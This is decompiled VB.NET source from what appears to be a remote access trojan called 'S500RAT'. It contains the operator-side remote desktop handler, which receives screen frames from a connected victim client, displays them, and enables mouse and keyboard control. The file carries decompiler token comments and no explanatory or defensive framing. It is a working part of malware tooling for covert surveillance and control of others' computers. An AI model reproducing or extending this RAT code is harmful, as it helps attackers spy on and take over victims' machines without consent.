Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My.Resources
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200005B RID: 91
	Public Class FrmRemoteDesktop
		' Token: 0x060011B4 RID: 4532 RVA: 0x0009D480 File Offset: 0x0009B680
		Public Sub Capture(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formRemoteDesktop As FormRemoteDesktop = CType(Application.OpenForms("FormRemoteDesktop" + unpack_msgpack.ForcePathObject("ID").AsString), FormRemoteDesktop)
				Try
					Dim flag As Boolean = formRemoteDesktop IsNot Nothing
					If flag Then
						Dim flag2 As Boolean = formRemoteDesktop.Client Is Nothing
						If flag2 Then
							formRemoteDesktop.Client = client
							formRemoteDesktop.Timer1.Start()
							formRemoteDesktop.StartAndStop.PerformClick()
							formRemoteDesktop.StartAndStop.Enabled = True
							formRemoteDesktop.Mouse.Enabled = True
							formRemoteDesktop.Keyboard.Enabled = True
							formRemoteDesktop.Video.Enabled = True
							formRemoteDesktop.QualityUsing.Enabled = True
							Dim asBytes As Byte() = unpack_msgpack.ForcePathObject("Stream").GetAsBytes()
							Dim bitmap As Bitmap = formRemoteDesktop.decoder.DecodeData(New MemoryStream(asBytes))
							formRemoteDesktop.rdSize = bitmap.Size
						End If
						Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
						If Operators.CompareString(asString, "Start", False) <> 0 Then
							If Operators.CompareString(asString, "Stop", False) = 0 Then
								formRemoteDesktop.PictureBox1.Image.Dispose()
								formRemoteDesktop.PictureBox1.Image = Resources.XXXX
							End If
						Else
							Dim bitmap2 As Bitmap = formRemoteDesktop.decoder.DecodeData(New MemoryStream(unpack_msgpack.ForcePathObject("Stream").GetAsBytes()))
							Dim image As Bitmap = New Bitmap(bitmap2.Width, bitmap2.Width)
							Dim syncPicbox As Object = formRemoteDesktop.syncPicbox
							ObjectFlowControl.CheckForSyncLockOnValueType(syncPicbox)
							SyncLock syncPicbox
								image = bitmap2
								formRemoteDesktop.PictureBox1.Image = image
								Dim formRemoteDesktop2 As FormRemoteDesktop = formRemoteDesktop
								Dim ptr As Integer = formRemoteDesktop2.IntFPS
								formRemoteDesktop2.IntFPS = ptr + 1
								Dim flag4 As Boolean = formRemoteDesktop.sw.ElapsedMilliseconds >= 1000L
								If flag4 Then
									formRemoteDesktop.FPS.Text = Conversions.ToString(formRemoteDesktop.IntFPS)
									formRemoteDesktop.sw = Stopwatch.StartNew()
									formRemoteDesktop.DisplayScreen.Text = (Conversions.ToString(bitmap2.Width) + " x " + Conversions.ToString(bitmap2.Height)).ToString()
									formRemoteDesktop.IntFPS = 0
									formRemoteDesktop.rdSize = bitmap2.Size
								End If
							End SyncLock
						End If
					Else
						client.Disconnected()
					End If
				Catch ex As Exception
					Debug.WriteLine(ex.Message)
				End Try
			Catch ex2 As Exception
			End Try
		End Sub
	End Class
End Namespace
